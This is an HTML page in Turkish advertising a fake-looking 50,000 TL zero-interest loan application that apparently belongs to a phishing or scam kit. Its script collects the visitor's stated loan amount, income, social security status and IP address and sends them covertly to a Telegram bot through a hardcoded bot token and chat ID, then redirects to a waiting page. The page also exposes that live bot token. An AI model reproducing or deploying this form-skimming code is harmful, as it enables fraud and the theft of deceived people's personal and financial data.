<body>

    <h1>50.000TL %0 Faiz Kredi Başvurusu</h1>

    <h2>TALEP EDİLEN KREDİ TUTARI:</h2>
    <input type="text" id="krediTutari" placeholder="Kredi Tutarı (TL)">
    
    <h2>AYLIK NET GELİR:</h2>
    <input type="text" id="netGelir" placeholder="Aylık Net Gelir (TL)">
    
    <h2>BAĞLI OLDUĞUNUZ SGK KURUMU:</h2>
    <select id="sgkKurumu">
        <option value="">Seçiniz</option>
        <option value="SSK">SSK</option>
        <option value="BAĞKUR">BAĞKUR</option>
        <option value="YOK">YOK</option>
        <option value="EMEKLİ BULAN">EMEKLİ </option>
    </select>

    <h2>ÖDEMELER AYIN KAÇINCI HAFTASINDA OLSUN:</h2>
    <select id="odemeHaftasi">
        <option value="">Seçiniz</option>
        <option value="1.HAFTA">1.HAFTA</option>
        <option value="2.HAFTA">2.HAFTA</option>
        <option value="3.HAFTA">3.HAFTA</option>
        <option value="4.HAFTA">4.HAFTA</option>
    </select>
<br>
    <button id="applyButton">BAŞVUR</button>
    
    <div id="errorMessage" class="error"></div>

    <script>
        // IP adresini al
        function getIPAddress() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('IP adresi alınamadı:', error);
                    return 'IP alınamadı'; // Hata durumunda bir mesaj döndür
                });
        }

        document.getElementById("applyButton").addEventListener("click", () => {
            const krediTutari = document.getElementById("krediTutari").value.trim();
            const netGelir = document.getElementById("netGelir").value.trim();
            const sgkKurumu = document.getElementById("sgkKurumu").value;
            const odemeHaftasi = document.getElementById("odemeHaftasi").value;

            const errorMessageElement = document.getElementById("errorMessage");
            errorMessageElement.textContent = ''; // Hata mesajını temizle

            // Boş alanları kontrol et
            if (!krediTutari || !netGelir || !sgkKurumu || !odemeHaftasi) {
                errorMessageElement.textContent = 'Bilgileri eksik doldurdunuz. Lütfen kontrol ediniz.';
                return; // İşlemden çık
            }

            const chatId = "-1002343753859"; // Telegram chat ID
            const token = "7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY"; // Telegram API token

            // IP adresini al ve mesajı gönder
            getIPAddress().then(ipAddress => {
                const message = `
                    Kredi Başvurusu:
                    Talep Edilen Kredi Tutarı: ${krediTutari} TL
                    Aylık Net Gelir: ${netGelir} TL
                    SGK Kurumu: ${sgkKurumu}
                    Ödemeler Ayın: ${odemeHaftasi}
                    Kullanıcının IP Adresi: ${ipAddress}
                `;

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Başvuru gönderildi!');
                        // Başvuru butonuna basıldıktan sonra bekle3.html sayfasına yönlendirme
                        window.location.href = "bekle3.html";
                    } else {
                        console.error('Mesaj gönderilemedi:', response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Hata:', error);
                });
            });
        });
    </script>
